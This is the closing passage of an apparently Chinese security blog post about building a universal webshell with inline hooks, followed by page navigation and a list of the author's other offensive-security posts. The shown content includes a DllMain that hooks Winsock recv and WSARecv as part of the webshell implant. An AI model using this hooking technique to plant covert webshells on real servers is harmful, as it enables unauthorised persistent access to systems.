+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL WINAPI <span class="title">DllMain</span><span class="params">(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">switch</span>(fdwReason)</span><br><span class="line">	&#123;</span><br><span class="line">	<span class="keyword">case</span> DLL_PROCESS_ATTACH:</span><br><span class="line">		InstallHook(<span class="string">L"ws2_32.dll"</span>, <span class="string">"recv"</span>, (LPVOID) HookRecv);</span><br><span class="line">		InstallHook(<span class="string">L"ws2_32.dll"</span>, <span class="string">"WSARecv"</span>, (LPVOID) HookWSARecv);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> DLL_THREAD_ATTACH:</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> DLL_THREAD_DETACH:</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> DLL_PROCESS_DETACH:</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h1 id="效果"><a href="#效果" class="headerlink" title="效果"></a>效果</h1><h2 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h2><p><img src="/2021/07/01/use-inlinehook-technology-to-make-a-more-general-webshell/java.gif" alt="java"></p>
+<h2 id="Python"><a href="#Python" class="headerlink" title="Python"></a>Python</h2><p><img src="/2021/07/01/use-inlinehook-technology-to-make-a-more-general-webshell/python.gif" alt="python"></p>
+
+      
+    </div>
+    
+  </div>
+  
+    
+    <div class="copyright">
+        <p><span>本文标题:</span><a href="">利用 Hook 技术打造通用的 Webshell</a></p>
+        <p><span>文章作者:</span><a href="/" title="回到主页">Jayl1n</a></p>
+        <p><span>发布时间:</span>2021-07-01, 20:08:53</p>
+        <p><span>最后更新:</span>2023-08-16, 23:16:43</p>
+        <p>
+            <span>原始链接:</span><a class="post-url" href="" title="利用 Hook 技术打造通用的 Webshell">https://jayl1n.github.io/2021/07/01/use-inlinehook-technology-to-make-a-more-general-webshell/</a>
+            <span class="copy-path" data-clipboard-text="原文: https://jayl1n.github.io/2021/07/01/use-inlinehook-technology-to-make-a-more-general-webshell/　　作者: Jayl1n" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
+            <script> var clipboard = new Clipboard('.copy-path'); </script>
+        </p>
+        <p>
+            <span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target = "_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
+        </p>
+    </div>
+
+
+
+    <nav id="article-nav">
+        
+            <div id="article-nav-newer" class="article-nav-title">
+                <a href="../../04/realpwn-vtable-hijacking-exercise/">
+                    【RealPwn-1】 虚函数表劫持练习
+                </a>
+            </div>
+        
+        
+            <div id="article-nav-older" class="article-nav-title">
+                <a href="../../../06/23/compile-v8-on-windows10/">
+                    在 Win10 上编译 V8 引擎
+                </a>
+            </div>
+        
+    </nav>
+
+  
+</article>
+
+    <div id="toc" class="toc-article">
+        <strong class="toc-title">文章目录</strong>
+        
+            <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#原理"><span class="toc-number">1.</span> <span class="toc-text">原理</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Inline-Hook"><span class="toc-number">2.</span> <span class="toc-text">Inline Hook</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#实现"><span class="toc-number">3.</span> <span class="toc-text">实现</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#InstallHook"><span class="toc-number">3.1.</span> <span class="toc-text">InstallHook</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#UninstallHook"><span class="toc-number">3.2.</span> <span class="toc-text">UninstallHook</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#HookRecv"><span class="toc-number">3.3.</span> <span class="toc-text">HookRecv</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#DllMain"><span class="toc-number">3.4.</span> <span class="toc-text">DllMain</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#效果"><span class="toc-number">4.</span> <span class="toc-text">效果</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Java"><span class="toc-number">4.1.</span> <span class="toc-text">Java</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Python"><span class="toc-number">4.2.</span> <span class="toc-text">Python</span></a></li></ol></li></ol>
+        
+    </div>
+    <style>
+        .left-col .switch-btn,
+        .left-col .switch-area {
+            display: none;
+        }
+        .toc-level-3 i,
+        .toc-level-3 ol {
+            display: none !important;
+        }
+    </style>
+
+    <input type="button" id="tocButton" value="隐藏目录"  title="点击按钮隐藏或者显示文章目录">
+
+    <script>
+        yiliaConfig.toc = ["隐藏目录", "显示目录", !!"false"];
+    </script>
+
+
+
+    
+<div class="share">
+    
+        <div class="bdsharebuttonbox">
+            <a href="#" class="fa fa-twitter bds_twi" data-cmd="twi" title="分享到推特"></a>
+            <a href="#" class="fa fa-weibo bds_tsina" data-cmd="tsina" title="分享到新浪微博"></a>
+            <a href="#" class="fa fa-qq bds_sqq" data-cmd="sqq" title="分享给 QQ 好友"></a>
+            <a href="#" class="fa fa-files-o bds_copy" data-cmd="copy" title="复制网址"></a>
+            <a href="#" class="fa fa fa-envelope-o bds_mail" data-cmd="mail" title="通过邮件分享"></a>
+            <a href="#" class="fa fa-weixin bds_weixin" data-cmd="weixin" title="生成文章二维码"></a>
+            <a href="#" class="fa fa-share-alt bds_more" data-cmd="more"></i></a>
+        </div>
+        <script>
+            window._bd_share_config={
+                "common":{"bdSnsKey":{},"bdText":"利用 Hook 技术打造通用的 Webshell　| Jayl1n's Blog　","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
+        </script>
+    
+
+    
+</div>
+
+
+
+
+
+
+
+    
+        <section id="comments">
+    <style> aside.comment-bar { margin: auto 30px; }</style>
+    <div id="disqus_thread"></div>
+    <script>
+        var disqus_config = function(){
+            this.page.url = 'https://jayl1n.github.io/2021/07/01/use-inlinehook-technology-to-make-a-more-general-webshell/';
+            this.page.identifier = '2021/07/01/use-inlinehook-technology-to-make-a-more-general-webshell/';
+        };
+        var loadComment = function(){
+            var d = document, s = d.createElement('script');
+            s.src = '//jayl1n-github-io.disqus.com/embed.js';
+            s.setAttribute('data-timestamp', +new Date());
+            (d.head || d.body).appendChild(s);
+        }
+    </script>
+    
+    <script> loadComment(); </script>
+
+</section>
+
+
+    
+
+
+
+
+    <div class="scroll" id="post-nav-button">
+        
+            <a href="../../04/realpwn-vtable-hijacking-exercise/" title="上一篇: 【RealPwn-1】 虚函数表劫持练习">
+                <i class="fa fa-angle-left"></i>
+            </a>
+        
+
+        <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
+
+        
+            <a href="../../../06/23/compile-v8-on-windows10/" title="下一篇: 在 Win10 上编译 V8 引擎">
+                <i class="fa fa-angle-right"></i>
+            </a>
+        
+    </div>
+
+    <ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="../../../../2022/02/27/v8-sandbox-escape/">V8 沙盒绕过</a></li><li class="post-list-item"><a class="post-list-link" href="../../../10/05/pentest-gb28181-attack/">GB28181 的一点小问题</a></li><li class="post-list-item"><a class="post-list-link" href="../../07/realpwn-heap-spary-exercise/">【RealPwn-2】 堆喷练习</a></li><li class="post-list-item"><a class="post-list-link" href="../../04/realpwn-vtable-hijacking-exercise/">【RealPwn-1】 虚函数表劫持练习</a></li><li class="post-list-item"><a class="post-list-link" href="">利用 Hook 技术打造通用的 Webshell</a></li><li class="post-list-item"><a class="post-list-link" href="../../../06/23/compile-v8-on-windows10/">在 Win10 上编译 V8 引擎</a></li><li class="post-list-item"><a class="post-list-link" href="../../../02/05/antiav-jsp-webshell/">JSP免杀 —— 绕过智能AI？</a></li><li class="post-list-item"><a class="post-list-link" href="../../../01/03/compile-virtualbox-on-macos10-15/">MacOS 下编译 VirtualBox</a></li><li class="post-list-item"><a class="post-list-link" href="../../../../2020/04/10/pentest-cobaltstrike-improve/">魔改 CobaltStrike 3.14 实现域前置自定义端口</a></li><li class="post-list-item"><a class="post-list-link" href="../../../../2020/02/13/java-nohup-implementation/">Java 实现后台执行</a></li><li class="post-list-item"><a class="post-list-link" href="../../../../2020/01/04/happy-new-year-2020/">2020 大家新年快乐鸭</a></li><li class="post-list-item"><a class="post-list-link" href="../../../../2019/06/26/sctf-2019-babyEoP-Writeup/">SCTF2019 babyEoP Writeup</a></li><li class="post-list-item"><a class="post-list-link" href="../../../../2019/03/29/pentest-getpassword/">Windows下抓取明文密码</a></li><li class="post-list-item"><a class="post-list-link" href="../../../../2019/01/08/tools-load-shellcode/">【GSL】 从内存加载 SHELLCODE 绕过AV查杀</a></li><li class="post-list-item"><a class="post-list-link" href="../../../../2018/12/30/java-audit-step-by-step-4/">从1开始的Java代码审计·第四弹·SSRF</a></li><li class="post-list-item"><a class="post-list-link" href="../../../../2018/11/15/java-audit-step-by-step-3/">从1开始的Java代码审计·第三弹·SQL注入</a></li><li class="post-list-item"><a class="post-list-link" href="../../../../2018/10/29/java-audit-step-by-step-2/">从1开始的Java代码审计·第二弹·基础篇（下）</a></li><li class="post-list-item"><a class="post-list-link" href="../../../../2018/10/25/java-audit-step-by-step-1/">从1开始的Java代码审计·第一弹·基础篇（上）</a></li><li class="post-list-item"><a class="post-list-link" href="../../../../2018/10/25/java-audit-step-by-step-0/">从1开始的Java代码审计·序</a></li><li class="post-list-item"><a class="post-list-link" href="../../../../2018/10/05/pentest-20181005/">渗透日记-20181005</a></li><li class="post-list-item"><a class="post-list-link" href="../../../../2018/09/18/summary-command-execution/">PHP中的命令执行</a></li><li class="post-list-item"><a class="post-list-link" href="../../../../2018/09/11/ichunqiu-web-BLOG/">i春秋-Web-BLOG</a></li><li class="post-list-item"><a class="post-list-link" href="../../../../2018/09/10/ichunqiu-web-SQLi/">i春秋-Web-SQLi</a></li><li class="post-list-item"><a class="post-list-link" href="../../../../2018/09/09/daily-life-20180909/">日常心路-180909</a></li><li class="post-list-item"><a class="post-list-link" href="../../../../2018/08/01/crawl-admin5/">爬虫之批量下载Admin5源码</a></li><li class="post-list-item"><a class="post-list-link" href="../../../../2018/07/31/yesterday-and-tomorrow/">昨天，明天</a></li></ul>
+
+
+
+
+    <script>
+        
+    </script>
+</div>
+      <footer id="footer">
+    <div class="outer">
+        <div id="footer-info">
+            <div class="footer-left">
+                <i class="fa fa-copyright"></i> 
+                2018-2023 Jayl1n
+            </div>
+            <div class="footer-right">
+                <span id="timeDate">载入天数...</span><span id="times">载入时分秒...</span>
+            </div>
+        </div>
+        
+            <div class="visit">
+                
+                    <span id="busuanzi_container_site_pv" style='display:none'>
+                        <span id="site-visit" title="本站到访数"><i class="fa fa-user" aria-hidden="true"></i><span id="busuanzi_value_site_uv"></span>
+                        </span>
+                    </span>
+                
+                
+                    <span>| </span>
+                
+                
+                    <span id="busuanzi_container_page_pv" style='display:none'>
+                        <span id="page-visit"  title="本页阅读量"><i class="fa fa-eye animated infinite pulse" aria-hidden="true"></i><span id="busuanzi_value_page_pv"></span>
+                        </span>
+                    </span>
+                
+            </div>
+        
+    </div>
+</footer>
+
+<script>
+    var now = new Date(); 
+    function createtime() { 
+        var grt= new Date("07/31/2018 00:00:00");//此处修改你的建站时间或者网站上线时间 
+        now.setTime(now.getTime()+250); 
+        days = (now - grt ) / 1000 / 60 / 60 / 24; dnum = Math.floor(days); 
+        hours = (now - grt ) / 1000 / 60 / 60 - (24 * dnum); hnum = Math.floor(hours); 
+        if(String(hnum).length ==1 ){hnum = "0" + hnum;} minutes = (now - grt ) / 1000 /60 - (24 * 60 * dnum) - (60 * hnum); 
+        mnum = Math.floor(minutes); if(String(mnum).length ==1 ){mnum = "0" + mnum;} 
+        seconds = (now - grt ) / 1000 - (24 * 60 * 60 * dnum) - (60 * 60 * hnum) - (60 * mnum); 
+        snum = Math.round(seconds); if(String(snum).length ==1 ){snum = "0" + snum;} 
+        document.getElementById("timeDate").innerHTML = "本站已运行 "+dnum+" 天 "; 
+        document.getElementById("times").innerHTML = hnum + " 小时 " + mnum + " 分 " + snum + " 秒"; 
+    } 
+setInterval("createtime()",250);
+</script>
+    </div>
+    
+<script data-main="/js/main.js" src="//cdn.bootcss.com/require.js/2.2.0/require.min.js"></script>
+
+    <script>
+        $(document).ready(function() {
+            var iPad = window.navigator.userAgent.indexOf('iPad');
+            if (iPad > -1 || $(".left-col").css("display") === "none") {
+                var bgColorList = ["#9db3f4", "#414141", "#e5a859", "#f5dfc6", "#c084a0", "#847e72", "#cd8390", "#996731"];
+                var bgColor = Math.ceil(Math.random() * (bgColorList.length - 1));
+                $("body").css({"background-color": bgColorList[bgColor], "background-size": "cover"});
+            }
+            else {
+                var backgroundnum = 20;
+                var backgroundimg = "url(/background/bg-x.jpg)".replace(/x/gi, Math.ceil(Math.random() * backgroundnum));
+                $("body").css({"background": backgroundimg, "background-attachment": "fixed", "background-size": "cover"});
+            }
+        })
+    </script>
+
+
+
+
+
+<div class="scroll" id="scroll">
+    <a href="#" title="返回顶部"><i class="fa fa-arrow-up"></i></a>
+    <a href="#comments" onclick="load$hide();" title="查看评论"><i class="fa fa-comments-o"></i></a>
+    <a href="#footer" title="转到底部"><i class="fa fa-arrow-down"></i></a>
+</div>
+<script>
+    // Open in New Window
+    
+        var oOpenInNew = {
+            
+            
+            
+            
+            
+            
+             archives: ".archive-article-title", 
+             miniArchives: "a.post-list-link", 
+            
+             friends: "#js-friends a", 
+             socail: ".social a" 
+        }
+        for (var x in oOpenInNew) {
+            $(oOpenInNew[x]).attr("target", "_blank");
+        }
+    
+</script>
+
+<script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js">
+</script>
+  </div>
+</body>
+</html>
